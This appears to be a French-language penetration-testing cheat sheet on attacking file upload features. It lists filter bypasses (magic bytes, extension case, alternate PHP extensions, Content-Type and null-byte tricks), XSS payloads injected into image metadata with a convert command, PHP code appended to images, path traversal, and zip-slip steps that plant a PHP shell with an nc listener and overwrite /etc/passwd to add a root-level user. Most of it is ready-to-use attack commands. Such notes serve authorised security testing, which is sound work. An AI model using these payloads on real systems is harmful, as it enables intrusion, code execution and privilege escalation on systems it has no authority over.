# Upload

Tester l'upload dans les divers menu (changement de logo ...)

* Contourner les protections :
  * Magic number
    * GIF : GIF89a
  * Casse extension
    * `<FILE>.pHp`
  * Upload un fichier ..JPEG (ou autre format accepté)
    * Intercepter via Burp et changer l'extension
  * Modifier le **Content-Type** via BURP
    * `Content-Type: application/x-php`
  * Ajouter un null byte `%00` au sein de l'extension
  * Blacklist d'extension peut restrictif
    * Extension PHP fonctionnelles : `phtml` - `php4` - `php3` - `php5` - `phps` - `phar`
* Les données EXIF (Exchangeable image file format) peuvent être supprimées des images JPEG/TIFF/RIFF
* Les données iTXt, tEXt, and zTXt peuvent être supprimées des images PNG
  * Encoding Web Shells in PNG IDAT chunks : [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
  * Exploiting PHP-GD imagecreatefromgif() function : [https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif)
* Renommer son fichier avec une injection XSS pour obtenir une XSS lors du download de fichier

[https://brutelogic.com.br/blog/file-upload-xss/](https://brutelogic.com.br/blog/file-upload-xss/) [https://blog.bentkowski.info/2015/05/xss-via-file-upload-wwwgooglecom.html](https://blog.bentkowski.info/2015/05/xss-via-file-upload-wwwgooglecom.html) [https://github.com/xapax/security/blob/master/bypass\_image\_upload.md](https://github.com/xapax/security/blob/master/bypass\_image\_upload.md)

* Injection du JS dans un fichier
  * `convert wallhaven.jpg -set 'Copyright' '/><script>alert("1");</script>' -set 'Title' '/><script>alert("2");</script>' -set comment '/><script>alert("3");</script>' OUT.png`
* Injecter phpinfo() à la fin de l'image `echo <?php phpinfo(); ?> >> <FILE>.jpeg`
* Injection possible aussi en injectant du code dans les metadata
  * `exiftool -t <PICTURE>`
    * Attention, les appli peuvent supprimer les metadata des images et donc le code PHP ne s'executerai pas
* Modifier l'extension de `<FILE>.jpeg` via Burp
* Modifier le chemin d'upload du fichier (ex: `../../../`), il est possible qu'il soit impossible d'exécuter certain type de fichier dans les dossiers d'images (.htaccess)
* Se rendre sur l'URL ou l'image/fichier PHP a été téléchargé, le code JPEG va s'afficher au début suivit du résultat du `phpinfo()`
* Contenus : `/opt/wordlists/fuzzdb/attack/file-upload`

Tester le composant de traitement d'image :

* Upload une image
  * L'afficher via URL
    * La télécharger depuis le site web
      * Vérifier si c'est la même que celle télécharger
        * Si ce n'est pas la même cela permet de savoir que l'image a été traitée
          * Essayer d'upload une image exploitant une vulnérabilité dans le composant traitant l'image

Upload un .lnk qui pointe sur une autre image

On peut ajouter un code PHP qui permet de récupérer un param GET On peut encoder le param en base64

* Upload de fichier .ZIP :

zip slip : happens when the archive has files with directory traversal paths in their names

If the target is vulnerable it will write the extracted files to the specified paths

* Use zip exploit to deploy a shell
  * `zip shell.zip ../../../../../../../../../../var/www/html/shell.php`
    * to put a shell in /var/www/html
  * `nc -nlvp <PORT>`
  * Execute the php file
* Use the zip exploit to overwrite `/etc/passwd`
  * Generate the hash of the password : `openssl passwd AAAA`
  * `echo "<NEW_USER>:<HASHES>:0:0:root:/root:/bin/bash" >> passwd`
  * ̀`zip passwd.zip ../../../../../../../../etc/passwd`
  * `su <NEW_USER>`
